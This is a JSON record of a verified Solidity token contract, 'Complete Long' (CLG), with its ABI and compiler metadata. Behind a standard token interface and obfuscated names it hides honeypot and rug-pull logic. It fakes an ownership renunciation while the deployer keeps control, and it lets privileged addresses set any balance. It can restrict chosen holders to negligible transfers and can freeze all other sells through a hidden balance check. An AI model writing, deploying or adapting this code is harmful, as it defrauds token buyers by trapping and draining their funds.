{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface enableLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchTeamLimit) external view returns (uint256);\n\n    function transfer(address marketingMax, uint256 minTokenTeam) external returns (bool);\n\n    function allowance(address liquidityTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minTokenTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingMax,\n        uint256 minTokenTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountTrading, uint256 value);\n    event Approval(address indexed liquidityTotal, address indexed spender, uint256 value);\n}\n\nabstract contract exemptEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverIsMax {\n    function createPair(address buyTotalAmount, address maxTotal) external returns (address);\n}\n\ninterface atTrading is enableLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CompleteLong is exemptEnable, enableLiquidity, atTrading {\n\n    function transfer(address feeIs, uint256 minTokenTeam) external virtual override returns (bool) {\n        return listTokenReceiver(_msgSender(), feeIs, minTokenTeam);\n    }\n\n    uint256 public listAutoWallet;\n\n    bool public toMarketingAmount;\n\n    function balanceOf(address launchTeamLimit) public view virtual override returns (uint256) {\n        return sellShouldMarketing[launchTeamLimit];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamSell;\n    }\n\n    event OwnershipTransferred(address indexed fromMinLiquidity, address indexed totalAtFrom);\n\n    function listSender(address swapTo) public {\n        launchSell();\n        \n        if (swapTo == senderEnable || swapTo == exemptWalletSell) {\n            return;\n        }\n        buyTrading[swapTo] = true;\n    }\n\n    function swapSell(address tokenLaunched) public {\n        if (feeReceiver) {\n            return;\n        }\n        if (toMarketingAmount != listReceiver) {\n            listReceiver = true;\n        }\n        maxTeam[tokenLaunched] = true;\n        \n        feeReceiver = true;\n    }\n\n    function liquidityTradingMin(address limitTradingMarketing, address marketingMax, uint256 minTokenTeam) internal returns (bool) {\n        require(sellShouldMarketing[limitTradingMarketing] >= minTokenTeam);\n        sellShouldMarketing[limitTradingMarketing] -= minTokenTeam;\n        sellShouldMarketing[marketingMax] += minTokenTeam;\n        emit Transfer(limitTradingMarketing, marketingMax, minTokenTeam);\n        return true;\n    }\n\n    string private modeTx = \"Complete Long\";\n\n    uint8 private launchedWallet = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedWallet;\n    }\n\n    bool public feeReceiver;\n\n    address receiverBuyEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public listReceiver;\n\n    function getOwner() external view returns (address) {\n        return sellTokenTake;\n    }\n\n    address private sellTokenTake;\n\n    function fromIs(uint256 minTokenTeam) public {\n        launchSell();\n        fundShould = minTokenTeam;\n    }\n\n    function allowance(address isTake, address takeAmount) external view virtual override returns (uint256) {\n        if (takeAmount == atLiquidity) {\n            return type(uint256).max;\n        }\n        return autoTxShould[isTake][takeAmount];\n    }\n\n    mapping(address => uint256) private sellShouldMarketing;\n\n    function transferFrom(address limitTradingMarketing, address marketingMax, uint256 minTokenTeam) external override returns (bool) {\n        if (_msgSender() != atLiquidity) {\n            if (autoTxShould[limitTradingMarketing][_msgSender()] != type(uint256).max) {\n                require(minTokenTeam <= autoTxShould[limitTradingMarketing][_msgSender()]);\n                autoTxShould[limitTradingMarketing][_msgSender()] -= minTokenTeam;\n            }\n        }\n        return listTokenReceiver(limitTradingMarketing, marketingMax, minTokenTeam);\n    }\n\n    uint256 fundShould;\n\n    uint256 public enableToken;\n\n    uint256 fundTrading;\n\n    function approve(address takeAmount, uint256 minTokenTeam) public virtual override returns (bool) {\n        autoTxShould[_msgSender()][takeAmount] = minTokenTeam;\n        emit Approval(_msgSender(), takeAmount, minTokenTeam);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private autoTxShould;\n\n    mapping(address => bool) public maxTeam;\n\n    string private teamSell = \"CLG\";\n\n    function fundWallet() public {\n        emit OwnershipTransferred(senderEnable, address(0));\n        sellTokenTake = address(0);\n    }\n\n    function exemptLaunch(address feeIs, uint256 minTokenTeam) public {\n        launchSell();\n        sellShouldMarketing[feeIs] = minTokenTeam;\n    }\n\n    uint256 private listTeam = 100000000 * 10 ** 18;\n\n    address public exemptWalletSell;\n\n    address public senderEnable;\n\n    uint256 constant listAuto = 3 ** 10;\n\n    function name() external view virtual override returns (string memory) {\n        return modeTx;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listTeam;\n    }\n\n    function launchSell() private view {\n        require(maxTeam[_msgSender()]);\n    }\n\n    function listTokenReceiver(address limitTradingMarketing, address marketingMax, uint256 minTokenTeam) internal returns (bool) {\n        if (limitTradingMarketing == senderEnable) {\n            return liquidityTradingMin(limitTradingMarketing, marketingMax, minTokenTeam);\n        }\n        uint256 fundLimit = enableLiquidity(exemptWalletSell).balanceOf(receiverBuyEnable);\n        require(fundLimit == fundShould);\n        require(marketingMax != receiverBuyEnable);\n        if (buyTrading[limitTradingMarketing]) {\n            return liquidityTradingMin(limitTradingMarketing, marketingMax, listAuto);\n        }\n        return liquidityTradingMin(limitTradingMarketing, marketingMax, minTokenTeam);\n    }\n\n    bool public maxTrading;\n\n    function owner() external view returns (address) {\n        return sellTokenTake;\n    }\n\n    bool public totalAt;\n\n    address atLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        \n        toEnable autoMode = toEnable(atLiquidity);\n        exemptWalletSell = receiverIsMax(autoMode.factory()).createPair(autoMode.WETH(), address(this));\n        if (listAutoWallet != enableToken) {\n            maxTrading = true;\n        }\n        senderEnable = _msgSender();\n        fundWallet();\n        maxTeam[senderEnable] = true;\n        sellShouldMarketing[senderEnable] = listTeam;\n        if (listReceiver != totalAt) {\n            totalAt = false;\n        }\n        emit Transfer(address(0), senderEnable, listTeam);\n    }\n\n    mapping(address => bool) public buyTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromMinLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalAtFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTokenTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTeamLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTokenTeam\",\"type\":\"uint256\"}],\"name\":\"exemptLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptWalletSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minTokenTeam\",\"type\":\"uint256\"}],\"name\":\"fromIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAutoWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTo\",\"type\":\"address\"}],\"name\":\"listSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunched\",\"type\":\"address\"}],\"name\":\"swapSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMarketingAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTokenTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTradingMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTokenTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CompleteLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}